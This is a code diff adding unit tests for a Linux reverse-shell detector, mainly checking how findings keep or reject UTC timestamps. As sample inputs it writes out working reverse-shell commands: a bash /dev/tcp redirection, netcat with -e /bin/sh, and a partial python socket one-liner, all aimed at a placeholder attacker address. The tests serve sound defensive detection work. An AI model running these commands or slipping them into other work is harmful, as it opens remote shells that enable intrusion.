@@ -93,3 +93,66 @@ def test_ignore_empty_executions():
     findings = detect_linux_reverse_shells([])
 
     assert findings == []
+
+
+def test_reverse_shell_finding_preserves_utc_time():
+    execution = create_execution(
+        "/bin/bash -i >& /dev/tcp/203.0.113.50/4444 0>&1"
+    )
+    execution.timestamp_utc = (
+        "2026-07-07T07:00:01.123456789+00:00"
+    )
+
+    original_timestamp = execution.timestamp
+
+    findings = detect_linux_reverse_shells(
+        [execution]
+    )
+
+    assert len(findings) == 1
+
+    finding = findings[0]
+
+    assert finding.title == "Linux Reverse Shell Detected"
+    assert finding.severity == "critical"
+    assert finding.first_seen == (
+        "2026-07-07T07:00:01.123456789+00:00"
+    )
+    assert finding.last_seen == (
+        "2026-07-07T07:00:01.123456789+00:00"
+    )
+
+    # Preserve the original Linux syslog timestamp.
+    assert execution.timestamp == original_timestamp
+    assert execution.timestamp == "Jul 7 10:00:01"
+
+
+def test_reverse_shell_does_not_invent_unknown_time():
+    execution = create_execution(
+        "nc -e /bin/sh 203.0.113.50 4444"
+    )
+
+    assert execution.timestamp_utc is None
+
+    findings = detect_linux_reverse_shells(
+        [execution]
+    )
+
+    assert len(findings) == 1
+    assert findings[0].first_seen is None
+    assert findings[0].last_seen is None
+
+
+def test_reverse_shell_rejects_invalid_utc_time():
+    execution = create_execution(
+        "python3 -c import socket,subprocess,os"
+    )
+    execution.timestamp_utc = "invalid timestamp"
+
+    findings = detect_linux_reverse_shells(
+        [execution]
+    )
+
+    assert len(findings) == 1
+    assert findings[0].first_seen is None
+    assert findings[0].last_seen is None
